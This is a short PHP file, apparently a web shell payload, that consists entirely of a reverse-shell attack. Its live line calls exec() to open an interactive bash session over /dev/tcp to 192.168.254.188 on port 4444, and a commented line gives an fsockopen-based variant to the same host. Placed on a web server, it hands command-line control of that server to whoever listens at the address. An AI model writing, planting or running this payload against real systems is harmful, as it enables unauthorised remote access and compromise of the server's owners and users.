<?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.254.188/4444 0>&1'");
// $sock=fsockopen("192.168.254.188",4444);exec("/bin/sh -i <&3 >&3 2>&3");

?>